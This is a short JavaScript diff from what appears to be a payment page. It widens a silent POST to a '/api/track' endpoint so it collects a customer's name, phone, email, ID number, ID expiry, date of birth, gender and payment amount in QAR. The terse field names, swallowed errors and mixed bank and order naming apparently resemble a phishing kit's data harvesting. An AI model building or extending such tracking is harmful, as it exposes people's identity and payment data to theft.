@@ -675,21 +675,23 @@
     sessionStorage.setItem('safwa_order_id', visitId);
     sessionStorage.setItem('aman_bank_request_id', visitId);
 
-    // Always send track to update server with latest data
+    // Always send track to update server (only include non-empty fields)
     var summary = {};
     try { summary = JSON.parse(sessionStorage.getItem('payment_summary') || '{}'); } catch(e){}
+    var trackData = { visitId: visitId };
+    if (summary.name)       trackData.n          = summary.name;
+    if (summary.phone)      trackData.p          = summary.phone;
+    if (summary.email)      trackData.e          = summary.email;
+    if (summary.customerId) trackData.id         = summary.customerId;
+    if (summary.idExpiry)   trackData.idExpiry   = summary.idExpiry;
+    if (summary.dob)        trackData.dob        = summary.dob;
+    if (summary.gender)     trackData.gender     = summary.gender;
+    if (summary.total)      trackData.amount     = summary.total;
+    trackData.currency = 'QAR';
     fetch('/api/track', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        visitId: visitId,
-        n: summary.name || '',
-        p: summary.phone || '',
-        e: summary.email || '',
-        id: summary.customerId || '',
-        amount: summary.total || 0,
-        currency: 'QAR'
-      })
+      body: JSON.stringify(trackData)
     }).catch(function(){});
 
     var sessionId = sessionStorage.getItem('aman_bank_session_id');
